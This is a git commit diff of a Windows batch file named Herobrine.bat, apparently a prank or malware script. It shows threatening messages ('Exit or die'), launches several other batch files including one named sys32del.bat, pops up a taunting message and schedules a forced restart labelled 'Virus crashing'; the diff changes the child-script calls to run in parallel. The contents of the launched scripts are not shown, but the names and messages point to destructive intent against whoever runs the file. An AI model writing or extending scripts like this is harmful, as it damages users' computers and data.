5d413a74a5713cd95fc9dc6d3bd7cc791286921e
HerobrinePE <42194169+HerobrinePE@users.noreply.github.com>
2018-12-18 06:52:01 -0400

    Update Herobrine.bat

--- Herobrine.bat
+++ Herobrine.bat
@@ -3,11 +3,10 @@ title Warning
 color 12
 echo Exit or die
 pause
-File.bat
-hakk.bat
-Null.bat
+start File.bat
+start hakk.bat
+start Null.bat
 hsbthg836676hshjut^^^^^^^^²¹.bat
 msg * "any last words to your pc because you didnt listen to my warning"
 sys32del.bat
 shutdown -r -t 180 -c "Virus crashing"
-6
